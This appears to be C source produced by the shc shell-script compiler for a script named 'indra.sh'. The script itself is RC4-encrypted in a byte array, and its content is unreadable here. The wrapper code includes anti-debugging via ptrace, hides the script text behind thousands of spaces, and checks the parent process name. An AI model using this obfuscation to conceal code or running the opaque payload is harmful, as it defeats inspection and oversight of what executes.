#if 0
	shc Version 4.0.2, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -r -f indra.sh 
#endif

static  char data [] = 
#define      tst1_z	22
#define      tst1	((&data[2]))
	"\157\364\146\056\267\313\100\127\257\037\063\002\061\326\271\264"
	"\162\356\064\254\234\311\060\167\176"
#define      chk2_z	19
#define      chk2	((&data[28]))
	"\322\271\055\113\143\270\207\032\364\354\253\141\175\311\145\001"
	"\352\152\324\046\217\165\211\334"
#define      shll_z	10
#define      shll	((&data[49]))
	"\025\051\047\303\051\325\010\142\116\373\143\000"
#define      xecc_z	15
#define      xecc	((&data[63]))
	"\072\110\372\323\012\153\304\125\377\230\207\134\267\075\206\210"
	"\030\055\004"
#define      text_z	570
#define      text	((&data[207]))
	"\231\046\022\030\156\202\015\354\201\252\175\124\144\253\335\101"
	"\357\372\361\123\373\112\010\260\204\120\336\210\042\302\030\273"
	"\350\053\324\126\255\341\103\057\214\300\204\360\154\141\061\133"
	"\134\042\256\127\154\266\007\361\006\346\172\051\250\222\344\221"
	"\275\271\347\153\233\053\232\047\354\036\027\130\200\111\264\334"
	"\153\142\063\330\031\073\312\040\041\104\111\312\327\056\133\225"
	"\350\103\000\203\156\233\252\132\272\302\263\073\013\147\027\167"
	"\312\113\117\344\206\031\004\250\136\116\162\065\175\316\313\261"
	"\333\011\146\270\034\247\147\327\201\247\206\347\001\263\167\266"
	"\156\062\102\277\137\372\132\073\252\071\025\202\045\356\100\040"
	"\024\220\107\163\255\047\153\120\327\053\061\037\171\052\304\354"
	"\303\314\042\111\145\203\035\134\061\211\374\303\033\014\022\000"
	"\377\340\125\103\274\212\102\060\077\271\237\237\202\366\115\255"
	"\311\070\304\131\007\272\334\136\152\151\117\316\031\004\063\164"
	"\263\005\262\077\001\165\364\206\210\077\243\355\135\111\166\234"
	"\210\130\246\340\143\227\045\112\370\256\224\027\054\270\005\001"
	"\371\247\246\343\272\223\124\121\373\261\155\021\315\315\363\264"
	"\137\364\020\362\114\075\117\270\371\000\122\363\312\051\311\361"
	"\270\172\230\340\065\340\114\011\034\242\177\235\375\251\211\157"
	"\004\145\314\346\056\250\154\026\167\145\022\211\341\064\147\055"
	"\073\370\224\075\231\000\334\026\304\076\036\230\054\214\172\356"
	"\324\036\246\006\324\320\375\242\176\225\267\146\313\050\255\171"
	"\046\311\340\324\220\216\062\301\351\270\362\053\371\152\044\370"
	"\361\267\205\063\374\307\102\064\224\116\366\133\324\046\077\153"
	"\015\244\013\370\353\360\221\214\111\007\273\352\213\373\134\145"
	"\025\027\242\063\270\011\262\361\064\357\213\236\221\214\273\354"
	"\210\060\105\215\002\177\370\136\171\301\332\363\215\324\322\175"
	"\355\223\212\277\177\056\013\064\045\243\123\023\077\175\300\212"
	"\025\051\131\230\241\261\356\067\342\046\020\110\254\016\024\162"
	"\313\310\137\205\042\067\154\077\133\263\137\333\242\373\354\106"
	"\064\273\347\363\114\344\116\305\001\122\045\125\333\167\360\215"
	"\222\162\217\053\355\330\241\201\223\207\021\162\172\250\251\052"
	"\322\042\206\276\323\317\275\042\041\330\226\375\100\122\130\141"
	"\053\025\061\306\037\104\221\330\277\335\116\175\062\064\356\336"
	"\153\004\104\327\012\210\207\161\030\301\364\263\010\222\062\137"
	"\153\100\164\235\317\061\266\226\362\133\007\176\022\005\260\016"
	"\163\145\065\123\115\236\047\156\061\262\145\113\324\353\173\234"
	"\321\101\013\116\164\206\123\004\170\074\313\231\057\063\367\212"
	"\236\222\335\030\157\264\006\256\305\054\003\220\260\051\011\335"
	"\266\222\065\134\074\304\274\361\337\376\355\207\337\274\234\206"
	"\035\170\051\173\365\073\076\276\042\064\076\111\321\266\073\216"
	"\156\073\227\374\173\322\075\154\250\130\266\255\371\276\050\300"
	"\327\277\215\010\051\015\330\112\211\152\013\330\063\117\262\030"
	"\037\203\017\060\011\304\334\113\304\145\021\313\350\177\147\223"
	"\332\041\125\215\134\140\364\164\327\276\300\047\242\107\101\247"
	"\357\237\366\142\325\163\060\240\330\101\154\301\301\323\124\233"
	"\365\252\050\122\012\035\306\342\334\206\012\177\316\113\046\275"
	"\353\034\040\300\220\120\141\151\222\315\052\124\241\177\360\226"
	"\051\030\350\064\065\257\027\022"
#define      inlo_z	3
#define      inlo	((&data[856]))
	"\377\036\057"
#define      pswd_z	256
#define      pswd	((&data[886]))
	"\301\127\324\342\030\145\063\171\316\306\107\370\032\351\170\012"
	"\177\241\043\147\325\131\026\354\153\114\016\377\142\362\250\365"
	"\113\304\374\200\305\316\073\235\355\127\250\270\122\347\164\305"
	"\234\010\173\333\162\105\036\162\074\113\162\237\076\033\225\212"
	"\337\221\013\245\137\107\103\115\236\353\006\361\322\173\266\157"
	"\203\062\113\366\170\152\151\265\266\333\124\364\366\351\176\326"
	"\173\211\174\333\321\277\050\157\252\057\140\175\252\027\355\056"
	"\112\071\044\302\244\215\167\132\150\314\116\137\266\315\066\061"
	"\127\262\015\050\162\065\230\035\145\371\232\020\020\210\076\133"
	"\302\142\035\146\357\225\300\130\142\017\267\030\335\356\112\064"
	"\240\127\135\022\215\365\057\362\356\312\002\377\123\101\132\025"
	"\243\170\174\223\016\075\353\160\114\243\211\051\221\323\136\062"
	"\052\273\105\270\260\165\252\237\077\255\237\223\356\372\251\222"
	"\162\045\045\201\142\021\361\257\265\172\331\106\116\067\171\171"
	"\362\276\061\243\063\334\103\163\211\343\006\170\335\260\013\120"
	"\325\060\321\070\101\303\350\366\075\301\075\214\370\267\005\353"
	"\165\066\217\251\022\323\034\234\266\043\025\223\323\040\343\250"
	"\121\265\341\222\170\311\211\266\212\307\102\374\120\172\264\022"
	"\322\211\365\352\356\050\144\274\356\254\265\010\225\055\023\025"
	"\316\066\174\244\220\223\221\373\340\237\367\061\031\254\104\354"
	"\065\071\327\043\141\073\340\120\350"
#define      chk1_z	22
#define      chk1	((&data[1190]))
	"\303\154\151\370\017\105\131\070\115\174\101\073\024\340\075\074"
	"\137\307\230\202\162\075\017\104\223\221"
#define      msg2_z	19
#define      msg2	((&data[1214]))
	"\226\003\155\175\252\057\002\123\237\134\233\023\010\102\227\332"
	"\375\151\301\063"
#define      rlax_z	1
#define      rlax	((&data[1234]))
	"\072"
#define      opts_z	1
#define      opts	((&data[1235]))
	"\336"
#define      tst2_z	19
#define      tst2	((&data[1238]))
	"\373\155\145\314\264\262\177\125\042\112\213\211\172\047\016\060"
	"\077\151\334\331\334\011\064\104\055"
#define      msg1_z	65
#define      msg1	((&data[1269]))
	"\347\151\243\100\347\146\255\172\010\331\315\173\201\336\221\063"
	"\207\273\211\301\002\130\317\244\146\326\347\166\256\116\000\277"
	"\076\022\302\270\313\335\140\222\024\272\320\112\311\123\061\234"
	"\274\040\003\124\232\164\332\046\147\345\026\113\135\060\124\036"
	"\061\236\052\300\055\340\011\053\066"
#define      date_z	1
#define      date	((&data[1334]))
	"\352"
#define      lsto_z	1
#define      lsto	((&data[1335]))
	"\032"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define HARDENINGSP	0	/* Define as 1 to disable bash child process */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;

    int lentmp = len;

#if HARDENINGSP
    //Start tracing to protect from dump & trace
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }

    //Decode Bash
    while (len > 0) {
        indx++;
        tmp = stte[indx];
        jndx += tmp;
        stte[indx] = stte[jndx];
        stte[jndx] = tmp;
        tmp += stte[indx];
        *ptr ^= stte[tmp];
        ptr++;
        len--;
    }

    //Exec bash script
    system(tmp2);

    //Empty script variable
    memcpy(tmp2, str, lentmp);

    //Sinal to detach ptrace
    ptrace(PTRACE_DETACH, 0, 0, 0);
    exit(0);

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
#endif /* HARDENINGSP Exit here anyway*/

    int pid, status;
    pid = fork();

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            printf("Operation not permitted\n");
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Exec bash script
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {
        wait(&status);
    }

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
} 
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
